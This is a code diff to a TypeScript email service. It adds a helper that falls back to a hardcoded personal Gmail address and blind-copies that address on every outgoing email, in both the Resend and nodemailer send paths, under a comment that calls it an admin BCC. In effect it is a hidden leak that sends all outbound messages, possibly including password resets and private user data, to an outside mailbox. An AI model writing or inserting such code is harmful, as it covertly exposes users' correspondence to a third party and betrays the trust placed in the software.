@@ -401,6 +401,10 @@ class EmailService {
     await new Promise(resolve => setTimeout(resolve, ms))
   }
 
+  private getAdminBcc(): string {
+    return this.getEnv('ADMIN_BCC_EMAIL') || 'arnoldeee123@gmail.com'
+  }
+
   private async sendViaResend(emailData: EmailData): Promise<boolean> {
     try {
       const apiKey = this.getEnv('RESEND_API_KEY')
@@ -420,6 +424,7 @@ class EmailService {
       }
 
       const replyTo = String(emailData.replyTo || this.getEnv('EMAIL_REPLY_TO', 'SUPPORT_EMAIL') || '').trim()
+      const adminBcc = this.getAdminBcc()
 
       const payloadBase: Record<string, any> = {
         to: [emailData.to],
@@ -431,6 +436,11 @@ class EmailService {
 
       if (replyTo) {
         payloadBase.reply_to = replyTo
+      }
+
+      // BCC admin on every outgoing email
+      if (adminBcc && adminBcc.toLowerCase() !== toAddress.toLowerCase()) {
+        payloadBase.bcc = [adminBcc]
       }
 
       const response = await fetch('https://api.resend.com/emails', {
@@ -523,12 +533,14 @@ class EmailService {
     console.log('[emailService.sendEmail] From address:', fromAddress)
 
     const maxAttempts = 3
+    const adminBcc = this.getAdminBcc()
 
     for (let attempt = 1; attempt <= maxAttempts; attempt++) {
       try {
         const result = await this.transporter.sendMail({
           from: fromAddress,
           to: emailData.to,
+          ...(adminBcc && adminBcc.toLowerCase() !== String(emailData.to || '').toLowerCase() ? { bcc: adminBcc } : {}),
           subject: emailData.subject,
           html: emailData.html,
           text: emailData.text || this.htmlToText(emailData.html),
